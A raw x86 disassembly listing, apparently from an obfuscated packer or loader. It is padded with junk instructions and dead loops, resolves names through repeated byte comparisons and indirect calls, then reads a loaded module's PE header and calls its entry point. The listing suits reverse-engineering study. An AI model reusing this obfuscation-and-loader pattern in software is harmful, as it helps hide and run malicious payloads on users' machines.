  41c2ed:	cmp    DWORD PTR ds:0x426edd,0x8
  41c2f4:	jne    0x41c309
  41c2fa:	xor    edx,edx
  41c2fc:	add    edx,DWORD PTR ds:0x426edd
  41c302:	dec    edx
  41c303:	mov    DWORD PTR ds:0x426edd,edx
  41c309:	mov    edx,DWORD PTR ds:0x426edd
  41c30f:	dec    edx
  41c310:	mov    DWORD PTR ds:0x426edd,edx
  41c316:	jmp    0x41c2bb
  41c31b:	mov    DWORD PTR [esp+0x1c],0xf89c85b4
  41c323:	lea    eax,[esp+0x34]
  41c327:	mov    DWORD PTR [esp+0x44],eax
  41c32b:	mov    esi,DWORD PTR ds:0x428e55
  41c331:	mov    ebx,DWORD PTR ds:0x42af09
  41c337:	sub    esi,ebx
  41c339:	sub    esi,DWORD PTR [esi+ebx*1]
  41c33c:	lea    eax,[esp+0x30]
  41c340:	mov    DWORD PTR [esp+0x28],eax
  41c344:	sub    DWORD PTR ds:0x426ea9,0x492f
  41c34e:	mov    eax,ds:0x4262c9
  41c353:	mov    edx,DWORD PTR ds:0x426ef9
  41c359:	sbb    DWORD PTR ds:0x426f05,edx
  41c35f:	mov    eax,DWORD PTR [eax+0x1c8]
  41c365:	mov    DWORD PTR ds:0x426f29,0x788d
  41c36f:	mov    eax,DWORD PTR [eax]
  41c371:	mov    edx,DWORD PTR [esp+0x28]
  41c375:	and    DWORD PTR ds:0x426efd,0x0
  41c37f:	jmp    0x41c393
  41c384:	xor    esi,esi
  41c386:	xor    esi,DWORD PTR ds:0x426efd
  41c38c:	inc    esi
  41c38d:	mov    DWORD PTR ds:0x426efd,esi
  41c393:	cmp    DWORD PTR ds:0x426efd,0x1a
  41c39a:	jae    0x41c3cb
  41c3a0:	cmp    DWORD PTR ds:0x426efd,0x1c
  41c3a7:	jge    0x41c3cb
  41c3ad:	jmp    0x41c3c6
  41c3b2:	push   DWORD PTR [ebp-0xc]
  41c3b5:	push   0x4c83
  41c3ba:	push   DWORD PTR [ebp-0x14]
  41c3bd:	push   DWORD PTR [ebp-0x1c]
  41c3c0:	call   DWORD PTR ds:0x42fa4c
  41c3c6:	jmp    0x41c384
  41c3cb:	mov    esi,0x75108b3
  41c3d0:	and    DWORD PTR ds:0x426e81,0x1564
  41c3da:	xor    eax,esi
  41c3dc:	mov    ebx,0x3272fa
  41c3e1:	add    eax,ebx
  41c3e3:	mov    DWORD PTR [edx],eax
  41c3e5:	mov    DWORD PTR ds:0x426ea1,0x7a67
  41c3ef:	mov    eax,ds:0x426d99
  41c3f4:	mov    DWORD PTR ds:0x426f1d,0x65da
  41c3fe:	cmp    eax,0x455dedfa
  41c403:	mov    DWORD PTR ds:0x426ea9,0x55fc
  41c40d:	jne    0x41c4f5
  41c413:	and    DWORD PTR ds:0x426ef5,0x0
  41c41d:	mov    eax,ds:0x426ef5
  41c422:	inc    eax
  41c423:	mov    ds:0x426ef5,eax
  41c428:	cmp    DWORD PTR ds:0x426ef5,0xd
  41c42f:	jl     0x41c479
  41c435:	jmp    0x41c454
  41c43a:	push   0x59de
  41c43f:	push   0x39ed
  41c444:	push   0x1b7c
  41c449:	push   0x44aa
  41c44e:	call   DWORD PTR ds:0x42fa1c
  41c454:	cmp    DWORD PTR ds:0x426ef5,0xc
  41c45b:	jne    0x41c46c
  41c461:	mov    eax,ds:0x426ef5
  41c466:	inc    eax
  41c467:	mov    ds:0x426ef5,eax
  41c46c:	cmp    DWORD PTR ds:0x426ef5,0x1f
  41c473:	jb     0x41c41d
  41c479:	mov    eax,DWORD PTR [esp+0x10]
  41c47d:	xor    edx,DWORD PTR ds:0x426ecd
  41c483:	mov    edx,DWORD PTR ds:0x4262c9
  41c489:	mov    edx,DWORD PTR [edx+0x198]
  41c48f:	add    DWORD PTR ds:0x426ec5,0x6b2
  41c499:	xor    eax,esi
  41c49b:	adc    DWORD PTR ds:0x426f25,0x426ef9
  41c4a5:	add    eax,ebx
  41c4a7:	and    DWORD PTR ds:0x426e85,0x426f15
  41c4b1:	mov    DWORD PTR [edx],eax
  41c4b3:	mov    eax,DWORD PTR [esp+0x10]
  41c4b7:	sub    DWORD PTR ds:0x426ec9,0x4e94
  41c4c1:	xor    eax,esi
  41c4c3:	add    eax,ebx
  41c4c5:	adc    DWORD PTR ds:0x426e81,0x426e91
  41c4cf:	mov    ds:0x426d99,eax
  41c4d4:	mov    eax,DWORD PTR [esp+0x10]
  41c4d8:	adc    DWORD PTR ds:0x426eed,0x426ef9
  41c4e2:	xor    eax,esi
  41c4e4:	add    eax,ebx
  41c4e6:	sub    DWORD PTR ds:0x426ea9,0x426e85
  41c4f0:	mov    ds:0x4263c1,eax
  41c4f5:	mov    eax,ds:0x4262c9
  41c4fa:	sbb    DWORD PTR ds:0x426f05,0x67a3
  41c504:	mov    eax,DWORD PTR [eax+0x18c]
  41c50a:	adc    DWORD PTR ds:0x426e91,0x180f
  41c514:	mov    eax,DWORD PTR [eax]
  41c516:	sbb    DWORD PTR ds:0x426eb1,0x4112
  41c520:	mov    DWORD PTR [esp+0x48],eax
  41c524:	adc    DWORD PTR ds:0x426eb9,edi
  41c52a:	mov    eax,0xf89c85b9
  41c52f:	mov    DWORD PTR [esp+0x38],eax
  41c533:	inc    DWORD PTR ds:0x426e8d
  41c539:	mov    DWORD PTR [esp+0x38],eax
  41c53d:	xor    DWORD PTR ds:0x426f11,0x441e
  41c547:	mov    DWORD PTR [esp+0x38],eax
  41c54b:	mov    DWORD PTR [esp+0x38],ecx
  41c54f:	neg    DWORD PTR ds:0x426f25
  41c555:	mov    DWORD PTR [esp+0x28],eax
  41c559:	movzx  eax,WORD PTR ds:0x426ec5
  41c560:	sbb    eax,DWORD PTR ds:0x426ee1
  41c566:	mov    ds:0x426ec5,eax
  41c56b:	mov    DWORD PTR [esp+0x28],0xf89c85bd
  41c573:	sbb    DWORD PTR ds:0x426ef9,0x58a6
  41c57d:	mov    eax,DWORD PTR [esp+0x10]
  41c581:	xor    eax,esi
  41c583:	add    eax,ebx
  41c585:	jmp    0x41c7a3
  41c58a:	mov    DWORD PTR ds:0x426eb5,0x6384
  41c594:	mov    al,ds:0x42647f
  41c599:	mov    DWORD PTR ds:0x426f01,0x6aa0
  41c5a3:	cmp    al,BYTE PTR ds:0x42648a
  41c5a9:	mov    DWORD PTR ds:0x426e85,0x34fb
  41c5b3:	jne    0x41c211
  41c5b9:	mov    DWORD PTR ds:0x426e99,0x7ac4
  41c5c3:	mov    al,ds:0x42649c
  41c5c8:	cmp    al,BYTE PTR ds:0x4264ab
  41c5ce:	mov    DWORD PTR ds:0x426e99,0x679f
  41c5d8:	jne    0x41c211
  41c5de:	push   0x4264b5
  41c5e3:	or     DWORD PTR ds:0x426e99,0x4d97
  41c5ed:	push   0x4264c5
  41c5f2:	call   edi
  41c5f4:	test   eax,eax
  41c5f6:	mov    DWORD PTR ds:0x426ecd,0x4160
  41c600:	je     0x41c211
  41c606:	mov    DWORD PTR ds:0x426ec5,0x29ef
  41c610:	mov    al,ds:0x4264db
  41c615:	cmp    al,BYTE PTR ds:0x4264e6
  41c61b:	jne    0x41c211
  41c621:	mov    al,ds:0x4264f8
  41c626:	mov    DWORD PTR ds:0x426ecd,0x6d7c
  41c630:	cmp    al,BYTE PTR ds:0x426507
  41c636:	mov    DWORD PTR ds:0x426ee5,0x7eb8
  41c640:	jne    0x41c211
  41c646:	sub    DWORD PTR ds:0x426ef9,0x282b
  41c650:	push   0x426511
  41c655:	push   0x426521
  41c65a:	call   edi
  41c65c:	sbb    DWORD PTR ds:0x426edd,0x426e9d
  41c666:	test   eax,eax
  41c668:	mov    DWORD PTR ds:0x426ee9,0x3f4b
  41c672:	je     0x41c211
  41c678:	and    DWORD PTR ds:0x426e91,0x0
  41c682:	xor    eax,eax
  41c684:	xor    eax,DWORD PTR ds:0x426e91
  41c68a:	inc    eax
  41c68b:	mov    ds:0x426e91,eax
  41c690:	cmp    DWORD PTR ds:0x426e91,0x9
  41c697:	ja     0x41c6d0
  41c69d:	jmp    0x41c6a8
  41c6a2:	call   DWORD PTR ds:0x42fa20
  41c6a8:	cmp    DWORD PTR ds:0x426e91,0x8
  41c6af:	jne    0x41c6c3
  41c6b5:	xor    eax,eax
  41c6b7:	add    eax,DWORD PTR ds:0x426e91
  41c6bd:	inc    eax
  41c6be:	mov    ds:0x426e91,eax
  41c6c3:	cmp    DWORD PTR ds:0x426e91,0x1a
  41c6ca:	jb     0x41c682
  41c6d0:	mov    eax,DWORD PTR [esp+0x1c]
  41c6d4:	adc    DWORD PTR ds:0x426f01,ecx
  41c6da:	mov    ecx,DWORD PTR [esp+0x28]
  41c6de:	xor    eax,esi
  41c6e0:	lea    eax,[eax+ecx*1+0x3272fa]
  41c6e7:	push   eax
  41c6e8:	xor    eax,DWORD PTR ds:0x426eb1
  41c6ee:	mov    eax,DWORD PTR [esp+0x3c]
  41c6f2:	adc    DWORD PTR ds:0x426ec1,0x19c6
  41c6fc:	xor    eax,esi
  41c6fe:	sbb    DWORD PTR ds:0x426ec5,0x426ea9
  41c708:	lea    eax,[ebp+eax*1+0x327302]
  41c70f:	xor    DWORD PTR ds:0x426ec1,0x34b0
  41c719:	push   eax
  41c71a:	xor    eax,DWORD PTR ds:0x426e99
  41c720:	mov    eax,ds:0x4262c9
  41c725:	adc    DWORD PTR ds:0x426ea5,0x426f09
  41c72f:	push   DWORD PTR [eax+0x1bc]
  41c735:	adc    DWORD PTR ds:0x426f0d,0x426ea5
  41c73f:	call   0x41d27f
  41c744:	mov    eax,DWORD PTR [esp+0x1c]
  41c748:	mov    ecx,DWORD PTR [esp+0x28]
  41c74c:	xor    eax,esi
  41c74e:	and    DWORD PTR ds:0x426e85,0x0
  41c758:	mov    edx,DWORD PTR ds:0x426e85
  41c75e:	inc    edx
  41c75f:	mov    DWORD PTR ds:0x426e85,edx
  41c765:	cmp    DWORD PTR ds:0x426e85,0x22
  41c76c:	jl     0x41c79c
  41c772:	jmp    0x41c78f
  41c777:	push   0x426000
  41c77c:	push   0x29cf
  41c781:	push   0x6715
  41c786:	push   DWORD PTR [ebp-0x18]
  41c789:	call   DWORD PTR ds:0x42fa24
  41c78f:	cmp    DWORD PTR ds:0x426e85,0x1b
  41c796:	jb     0x41c758
  41c79c:	lea    eax,[ecx+eax*1+0x3272fa]
  41c7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41c7a7:	mov    edx,DWORD PTR [esp+0x1c]
  41c7ab:	xor    edx,esi
  41c7ad:	sbb    DWORD PTR ds:0x426f29,0x426e8d
  41c7b7:	xor    ecx,esi
  41c7b9:	add    ecx,edx
  41c7bb:	sbb    edx,DWORD PTR ds:0x426f1d
  41c7c1:	mov    edx,DWORD PTR [esp+0x1c]
  41c7c5:	adc    DWORD PTR ds:0x426ef9,0x135a
  41c7cf:	xor    edx,esi
  41c7d1:	mov    DWORD PTR ds:0x426ee5,0x2979
  41c7db:	lea    ecx,[ecx+edx*1+0x9758ee]
  41c7e2:	mov    DWORD PTR ds:0x426f2d,0x689
  41c7ec:	mov    DWORD PTR [esp+0x28],eax
  41c7f0:	cmp    eax,ecx
  41c7f2:	mov    DWORD PTR ds:0x426efd,0x13db
  41c7fc:	jbe    0x41c58a
  41c802:	mov    eax,DWORD PTR [ebp+0xc]
  41c805:	mov    ds:0x42614d,eax
  41c80a:	and    DWORD PTR ds:0x426eb1,0x0
  41c814:	jmp    0x41c824
  41c819:	mov    eax,ds:0x426eb1
  41c81e:	inc    eax
  41c81f:	mov    ds:0x426eb1,eax
  41c824:	cmp    DWORD PTR ds:0x426eb1,0x19
  41c82b:	jae    0x41c851
  41c831:	cmp    DWORD PTR ds:0x426eb1,0x20
  41c838:	jl     0x41c851
  41c83e:	jmp    0x41c84c
  41c843:	push   DWORD PTR [ebp-0xc]
  41c846:	call   DWORD PTR ds:0x42fa28
  41c84c:	jmp    0x41c819
  41c851:	mov    eax,DWORD PTR [ebp+0x10]
  41c854:	mov    ds:0x4263a9,eax
  41c859:	mov    ecx,DWORD PTR ds:0x42af11
  41c85f:	mov    eax,ds:0x42af1d
  41c864:	sub    eax,ecx
  41c866:	xor    ecx,DWORD PTR [ecx+eax*1]
  41c869:	mov    eax,ds:0x42614d
  41c86e:	inc    ecx
  41c86f:	mov    ecx,DWORD PTR [esp+0x44]
  41c873:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c87d:	sub    eax,ebx
  41c87f:	sub    DWORD PTR ds:0x426eed,0x426f05
  41c889:	xor    eax,esi
  41c88b:	mov    DWORD PTR [ecx],eax
  41c88d:	mov    DWORD PTR ds:0x426ea1,0x1d16
  41c897:	lea    eax,[esp+0x20]
  41c89b:	mov    DWORD PTR ds:0x426f1d,0x743e
  41c8a5:	mov    DWORD PTR [esp+0x4c],eax
  41c8a9:	mov    DWORD PTR ds:0x426eb5,0x1725
  41c8b3:	lea    eax,[ebp+0x4]
  41c8b6:	mov    DWORD PTR ds:0x426f0d,0x331f
  41c8c0:	mov    DWORD PTR [esp+0x20],eax
  41c8c4:	mov    DWORD PTR ds:0x426ea1,0x4fd1
  41c8ce:	mov    al,ds:0x426537
  41c8d3:	cmp    al,BYTE PTR ds:0x426542
  41c8d9:	jne    0x41c211
  41c8df:	mov    al,ds:0x426554
  41c8e4:	mov    DWORD PTR ds:0x426e99,0x22c3
  41c8ee:	cmp    al,BYTE PTR ds:0x426563
  41c8f4:	mov    DWORD PTR ds:0x426f21,0x5c30
  41c8fe:	jne    0x41c211
  41c904:	sub    DWORD PTR ds:0x426eb5,0x53da
  41c90e:	push   0x42656d
  41c913:	sbb    DWORD PTR ds:0x426f0d,0x426f15
  41c91d:	push   0x42657d
  41c922:	sbb    DWORD PTR ds:0x426e81,0x426e95
  41c92c:	call   edi
  41c92e:	test   eax,eax
  41c930:	mov    DWORD PTR ds:0x426f09,0x3f7d
  41c93a:	je     0x41c211
  41c940:	mov    al,ds:0x426593
  41c945:	mov    DWORD PTR ds:0x426f09,0x7a71
  41c94f:	cmp    al,BYTE PTR ds:0x42659e
  41c955:	mov    DWORD PTR ds:0x426f21,0x448e
  41c95f:	jne    0x41c211
  41c965:	mov    al,ds:0x4265b0
  41c96a:	cmp    al,BYTE PTR ds:0x4265bf
  41c970:	jne    0x41c211
  41c976:	push   0x4265c9
  41c97b:	add    DWORD PTR ds:0x426eb9,0x4508
  41c985:	push   0x4265d9
  41c98a:	call   edi
  41c98c:	test   eax,eax
  41c98e:	je     0x41c211
  41c994:	mov    DWORD PTR ds:0x426ed1,0x4635
  41c99e:	mov    al,ds:0x4265ef
  41c9a3:	mov    DWORD PTR ds:0x426f11,0x2d29
  41c9ad:	cmp    al,BYTE PTR ds:0x4265fa
  41c9b3:	mov    DWORD PTR ds:0x426f1d,0x5285
  41c9bd:	jne    0x41c211
  41c9c3:	mov    DWORD PTR ds:0x426ecd,0x17c5
  41c9cd:	mov    al,ds:0x42660c
  41c9d2:	mov    DWORD PTR ds:0x426ecd,0x1f4b
  41c9dc:	cmp    al,BYTE PTR ds:0x42661b
  41c9e2:	jne    0x41c211
  41c9e8:	push   0x426625
  41c9ed:	adc    DWORD PTR ds:0x426ef1,0x426ee5
  41c9f7:	push   0x426635
  41c9fc:	call   edi
  41c9fe:	adc    DWORD PTR ds:0x426edd,0x72d
  41ca08:	test   eax,eax
  41ca0a:	je     0x41c211
  41ca10:	mov    DWORD PTR ds:0x426ed9,0x3296
  41ca1a:	mov    al,ds:0x42664b
  41ca1f:	mov    DWORD PTR ds:0x426e91,0x9e5
  41ca29:	cmp    al,BYTE PTR ds:0x426656
  41ca2f:	mov    DWORD PTR ds:0x426ee1,0x4731
  41ca39:	jne    0x41c211
  41ca3f:	mov    al,ds:0x426668
  41ca44:	cmp    al,BYTE PTR ds:0x426677
  41ca4a:	jne    0x41c211
  41ca50:	xor    DWORD PTR ds:0x426e85,0x78df
  41ca5a:	push   0x426681
  41ca5f:	push   0x426691
  41ca64:	call   edi
  41ca66:	test   eax,eax
  41ca68:	je     0x41c211
  41ca6e:	mov    DWORD PTR ds:0x426efd,0x48d1
  41ca78:	mov    al,ds:0x4266a7
  41ca7d:	mov    DWORD PTR ds:0x426eb1,0x58ba
  41ca87:	cmp    al,BYTE PTR ds:0x4266b2
  41ca8d:	jne    0x41c211
  41ca93:	mov    al,ds:0x4266c4
  41ca98:	mov    DWORD PTR ds:0x426ea9,0x5172
  41caa2:	cmp    al,BYTE PTR ds:0x4266d3
  41caa8:	mov    DWORD PTR ds:0x426ecd,0x25dc
  41cab2:	jne    0x41c211
  41cab8:	add    DWORD PTR ds:0x426ef5,0x426ea9
  41cac2:	push   0x4266dd
  41cac7:	mov    DWORD PTR ds:0x426f1d,0x534b
  41cad1:	push   0x4266ed
  41cad6:	xor    DWORD PTR ds:0x426e8d,0x426e89
  41cae0:	call   edi
  41cae2:	test   eax,eax
  41cae4:	mov    DWORD PTR ds:0x426f09,0x17e9
  41caee:	je     0x41c211
  41caf4:	mov    DWORD PTR ds:0x426f15,0x546d
  41cafe:	mov    al,ds:0x426703
  41cb03:	mov    DWORD PTR ds:0x426ec9,0x6884
  41cb0d:	cmp    al,BYTE PTR ds:0x42670e
  41cb13:	mov    DWORD PTR ds:0x426e95,0x724e
  41cb1d:	jne    0x41c211
  41cb23:	mov    DWORD PTR ds:0x426eb1,0x7b3e
  41cb2d:	mov    al,ds:0x426720
  41cb32:	mov    DWORD PTR ds:0x426ea9,0xb8a
  41cb3c:	cmp    al,BYTE PTR ds:0x42672f
  41cb42:	mov    DWORD PTR ds:0x426ea5,0xfff
  41cb4c:	jne    0x41c211
  41cb52:	adc    DWORD PTR ds:0x426e81,0x426ed5
  41cb5c:	push   0x426739
  41cb61:	push   0x426749
  41cb66:	call   edi
  41cb68:	mov    DWORD PTR ds:0x426eb1,0x513e
  41cb72:	test   eax,eax
  41cb74:	je     0x41c211
  41cb7a:	mov    al,ds:0x42675f
  41cb7f:	mov    DWORD PTR ds:0x426e8d,0x24d0
  41cb89:	cmp    al,BYTE PTR ds:0x42676a
  41cb8f:	jne    0x41c211
  41cb95:	mov    DWORD PTR ds:0x426eb1,0x7a1a
  41cb9f:	mov    al,ds:0x42677c
  41cba4:	mov    DWORD PTR ds:0x426ef5,0x1244
  41cbae:	cmp    al,BYTE PTR ds:0x42678b
  41cbb4:	mov    DWORD PTR ds:0x426ed1,0x3050
  41cbbe:	jne    0x41c211
  41cbc4:	sub    DWORD PTR ds:0x426ee1,0x426f25
  41cbce:	push   0x426795
  41cbd3:	add    DWORD PTR ds:0x426f11,0x40a8
  41cbdd:	push   0x4267a5
  41cbe2:	sub    DWORD PTR ds:0x426ef9,0x426e9d
  41cbec:	call   edi
  41cbee:	adc    DWORD PTR ds:0x426e99,0x426f0d
  41cbf8:	test   eax,eax
  41cbfa:	je     0x41c211
  41cc00:	mov    al,ds:0x4267bb
  41cc05:	mov    DWORD PTR ds:0x426f05,0xc7b
  41cc0f:	cmp    al,BYTE PTR ds:0x4267c6
  41cc15:	mov    DWORD PTR ds:0x426eb9,0x70f1
  41cc1f:	jne    0x41c211
  41cc25:	mov    al,ds:0x4267d8
  41cc2a:	mov    DWORD PTR ds:0x426f09,0x320
  41cc34:	cmp    al,BYTE PTR ds:0x4267e7
  41cc3a:	mov    DWORD PTR ds:0x426ee1,0xc80
  41cc44:	jne    0x41c211
  41cc4a:	sbb    DWORD PTR ds:0x426e85,0x426ea9
  41cc54:	push   0x4267f1
  41cc59:	adc    DWORD PTR ds:0x426f21,0x426f09
  41cc63:	push   0x426801
  41cc68:	call   edi
  41cc6a:	test   eax,eax
  41cc6c:	mov    DWORD PTR ds:0x426e9d,0x1d82
  41cc76:	je     0x41c211
  41cc7c:	mov    DWORD PTR ds:0x426e8d,0x4c1f
  41cc86:	mov    al,ds:0x426817
  41cc8b:	mov    DWORD PTR ds:0x426ebd,0x2305
  41cc95:	cmp    al,BYTE PTR ds:0x426822
  41cc9b:	mov    DWORD PTR ds:0x426e85,0x52ee
  41cca5:	jne    0x41c211
  41ccab:	mov    DWORD PTR ds:0x426eed,0x1308
  41ccb5:	mov    al,ds:0x426834
  41ccba:	cmp    al,BYTE PTR ds:0x426843
  41ccc0:	mov    DWORD PTR ds:0x426ea9,0x1ac4
  41ccca:	jne    0x41c211
  41ccd0:	push   0x42684d
  41ccd5:	push   0x42685d
  41ccda:	call   edi
  41ccdc:	xor    DWORD PTR ds:0x426eb5,0x537b
  41cce6:	test   eax,eax
  41cce8:	mov    DWORD PTR ds:0x426f2d,0x4412
  41ccf2:	je     0x41c211
  41ccf8:	mov    al,ds:0x426873
  41ccfd:	mov    DWORD PTR ds:0x426eb1,0x52c5
  41cd07:	cmp    al,BYTE PTR ds:0x42687e
  41cd0d:	mov    DWORD PTR ds:0x426f01,0x16df
  41cd17:	jne    0x41c211
  41cd1d:	mov    DWORD PTR ds:0x426ee1,0xd56
  41cd27:	mov    al,ds:0x426890
  41cd2c:	mov    DWORD PTR ds:0x426ed1,0x624d
  41cd36:	cmp    al,BYTE PTR ds:0x42689f
  41cd3c:	mov    DWORD PTR ds:0x426e95,0x6fa7
  41cd46:	jne    0x41c211
  41cd4c:	push   0x4268a9
  41cd51:	push   0x4268b9
  41cd56:	call   edi
  41cd58:	test   eax,eax
  41cd5a:	je     0x41c211
  41cd60:	mov    al,ds:0x4268cf
  41cd65:	mov    DWORD PTR ds:0x426ea5,0x6b61
  41cd6f:	cmp    al,BYTE PTR ds:0x4268da
  41cd75:	mov    DWORD PTR ds:0x426ef1,0x607d
  41cd7f:	jne    0x41c211
  41cd85:	mov    al,ds:0x4268ec
  41cd8a:	mov    DWORD PTR ds:0x426f11,0x76ce
  41cd94:	cmp    al,BYTE PTR ds:0x4268fb
  41cd9a:	mov    DWORD PTR ds:0x426ea9,0x7be9
  41cda4:	jne    0x41c211
  41cdaa:	push   0x426905
  41cdaf:	xor    DWORD PTR ds:0x426e89,0x5d69
  41cdb9:	push   0x426915
  41cdbe:	call   edi
  41cdc0:	test   eax,eax
  41cdc2:	je     0x41c211
  41cdc8:	mov    al,ds:0x42692b
  41cdcd:	mov    DWORD PTR ds:0x426eed,0x2af5
  41cdd7:	cmp    al,BYTE PTR ds:0x426936
  41cddd:	mov    DWORD PTR ds:0x426ed9,0x56c9
  41cde7:	jne    0x41c211
  41cded:	mov    DWORD PTR ds:0x426f09,0x21f5
  41cdf7:	mov    al,ds:0x426948
  41cdfc:	cmp    al,BYTE PTR ds:0x426957
  41ce02:	jne    0x41c211
  41ce08:	push   0x426961
  41ce0d:	sub    DWORD PTR ds:0x426ef1,0x426f19
  41ce17:	push   0x426971
  41ce1c:	call   edi
  41ce1e:	or     DWORD PTR ds:0x426f11,0x426ea1
  41ce28:	test   eax,eax
  41ce2a:	je     0x41c211
  41ce30:	mov    DWORD PTR ds:0x426f1d,0x33c9
  41ce3a:	mov    al,ds:0x426987
  41ce3f:	cmp    al,BYTE PTR ds:0x426992
  41ce45:	jne    0x41c211
  41ce4b:	mov    al,ds:0x4269a4
  41ce50:	cmp    al,BYTE PTR ds:0x4269b3
  41ce56:	jne    0x41c211
  41ce5c:	push   0x4269bd
  41ce61:	push   0x4269cd
  41ce66:	call   edi
  41ce68:	test   eax,eax
  41ce6a:	je     0x41c211
  41ce70:	mov    al,ds:0x4269e3
  41ce75:	cmp    al,BYTE PTR ds:0x4269ee
  41ce7b:	jne    0x41c211
  41ce81:	mov    al,ds:0x426a00
  41ce86:	cmp    al,BYTE PTR ds:0x426a0f
  41ce8c:	jne    0x41c211
  41ce92:	push   0x426a19
  41ce97:	push   0x426a29
  41ce9c:	call   edi
  41ce9e:	test   eax,eax
  41cea0:	je     0x41c211
  41cea6:	mov    al,ds:0x426a3f
  41ceab:	cmp    al,BYTE PTR ds:0x426a4a
  41ceb1:	jne    0x41c211
  41ceb7:	mov    al,ds:0x426a5c
  41cebc:	cmp    al,BYTE PTR ds:0x426a6b
  41cec2:	jne    0x41c211
  41cec8:	push   0x426a75
  41cecd:	push   0x426a85
  41ced2:	call   edi
  41ced4:	test   eax,eax
  41ced6:	je     0x41c211
  41cedc:	mov    al,ds:0x426a9b
  41cee1:	cmp    al,BYTE PTR ds:0x426aa6
  41cee7:	jne    0x41c211
  41ceed:	mov    al,ds:0x426ab8
  41cef2:	cmp    al,BYTE PTR ds:0x426ac7
  41cef8:	jne    0x41c211
  41cefe:	push   0x426ad1
  41cf03:	push   0x426ae1
  41cf08:	call   edi
  41cf0a:	test   eax,eax
  41cf0c:	je     0x41c211
  41cf12:	mov    al,ds:0x426af7
  41cf17:	cmp    al,BYTE PTR ds:0x426b02
  41cf1d:	jne    0x41c211
  41cf23:	mov    al,ds:0x426b14
  41cf28:	cmp    al,BYTE PTR ds:0x426b23
  41cf2e:	jne    0x41c211
  41cf34:	push   0x426b2d
  41cf39:	push   0x426b3d
  41cf3e:	call   edi
  41cf40:	test   eax,eax
  41cf42:	je     0x41c211
  41cf48:	mov    al,ds:0x426b53
  41cf4d:	cmp    al,BYTE PTR ds:0x426b5e
  41cf53:	jne    0x41c211
  41cf59:	mov    al,ds:0x426b70
  41cf5e:	cmp    al,BYTE PTR ds:0x426b7f
  41cf64:	jne    0x41c211
  41cf6a:	push   0x426b89
  41cf6f:	push   0x426b99
  41cf74:	call   edi
  41cf76:	test   eax,eax
  41cf78:	je     0x41c211
  41cf7e:	mov    al,ds:0x426baf
  41cf83:	cmp    al,BYTE PTR ds:0x426bba
  41cf89:	jne    0x41c211
  41cf8f:	mov    al,ds:0x426bcc
  41cf94:	cmp    al,BYTE PTR ds:0x426bdb
  41cf9a:	jne    0x41c211
  41cfa0:	push   0x426be5
  41cfa5:	push   0x426bf5
  41cfaa:	call   edi
  41cfac:	test   eax,eax
  41cfae:	je     0x41c211
  41cfb4:	mov    al,ds:0x426c0b
  41cfb9:	cmp    al,BYTE PTR ds:0x426c16
  41cfbf:	jne    0x41c211
  41cfc5:	mov    al,ds:0x426c28
  41cfca:	cmp    al,BYTE PTR ds:0x426c37
  41cfd0:	jne    0x41c211
  41cfd6:	push   0x426c41
  41cfdb:	push   0x426c51
  41cfe0:	call   edi
  41cfe2:	test   eax,eax
  41cfe4:	je     0x41c211
  41cfea:	mov    al,ds:0x426c67
  41cfef:	cmp    al,BYTE PTR ds:0x426c72
  41cff5:	jne    0x41c211
  41cffb:	mov    al,ds:0x426c84
  41d000:	cmp    al,BYTE PTR ds:0x426c93
  41d006:	jne    0x41c211
  41d00c:	push   0x426c9d
  41d011:	push   0x426cad
  41d016:	call   edi
  41d018:	test   eax,eax
  41d01a:	je     0x41c211
  41d020:	mov    eax,DWORD PTR [esp+0x34]
  41d024:	cmp    eax,0xf89c85b4
  41d029:	je     0x41d088
  41d02f:	mov    eax,DWORD PTR [esp+0x10]
  41d033:	mov    ecx,DWORD PTR [esp+0x30]
  41d037:	xor    eax,esi
  41d039:	add    eax,ebx
  41d03b:	cmp    eax,ecx
  41d03d:	je     0x41d088
  41d043:	mov    eax,ds:0x4262c9
  41d048:	mov    eax,DWORD PTR [eax+0x194]
  41d04e:	mov    ecx,DWORD PTR [eax]
  41d050:	mov    eax,DWORD PTR [ecx+0x3c]
  41d053:	push   DWORD PTR ds:0x4263a9
  41d059:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41d05d:	push   DWORD PTR ds:0x42614d
  41d063:	add    eax,ecx
  41d065:	mov    ecx,DWORD PTR ds:0x4262c9
  41d06b:	mov    ecx,DWORD PTR [ecx+0x194]
  41d071:	push   DWORD PTR [ecx]
  41d073:	call   eax
  41d075:	mov    ecx,DWORD PTR ds:0x4262c9
  41d07b:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d081:	mov    DWORD PTR [ecx],eax
  41d083:	jmp    0x41d259
  41d088:	mov    eax,DWORD PTR [esp+0x10]
  41d08c:	mov    ecx,DWORD PTR [esp+0x48]
  41d090:	xor    eax,esi
  41d092:	add    eax,ebx
  41d094:	cmp    eax,ecx
  41d096:	jne    0x41d101
  41d09c:	mov    eax,DWORD PTR [esp+0x10]
  41d0a0:	mov    ecx,DWORD PTR ds:0x4262c9
  41d0a6:	mov    ecx,DWORD PTR [ecx+0x198]
  41d0ac:	xor    eax,esi
  41d0ae:	add    eax,ebx
  41d0b0:	cmp    eax,DWORD PTR [ecx]
  41d0b2:	jne    0x41d0da
  41d0b8:	mov    eax,DWORD PTR [esp+0x10]
  41d0bc:	push   0xffffffff
  41d0be:	push   0x70941f8a
  41d0c3:	xor    eax,esi
  41d0c5:	add    eax,ebx
  41d0c7:	push   eax
  41d0c8:	push   0xf89c85b9
  41d0cd:	push   DWORD PTR [esp+0x2c]
  41d0d1:	push   DWORD PTR [esp+0x24]
  41d0d5:	call   0x417355
  41d0da:	push   DWORD PTR [esp+0x1c]
  41d0de:	push   DWORD PTR [esp+0x14]
  41d0e2:	call   0x401000
  41d0e7:	mov    eax,DWORD PTR [esp+0x10]
  41d0eb:	xor    eax,esi
  41d0ed:	add    eax,ebx
  41d0ef:	mov    ds:0x426355,eax
  41d0f4:	mov    eax,DWORD PTR [esp+0x10]
  41d0f8:	xor    eax,esi
  41d0fa:	add    eax,ebx
  41d0fc:	mov    ds:0x42634d,eax
  41d101:	mov    eax,DWORD PTR [esp+0x20]
  41d105:	test   eax,eax
  41d107:	je     0x41d259
  41d10d:	mov    DWORD PTR [esp+0x50],0xf152c3c
  41d115:	mov    DWORD PTR [esp+0x54],0x712edcf
  41d11d:	mov    DWORD PTR [esp+0x58],0x373fc2d
  41d125:	mov    DWORD PTR [esp+0x5c],0x72670add
  41d12d:	call   0x416fa9
  41d132:	mov    eax,DWORD PTR [esp+0x24]
  41d136:	mov    eax,DWORD PTR [esp+0x1c]
  41d13a:	mov    DWORD PTR [esp+0x44],eax
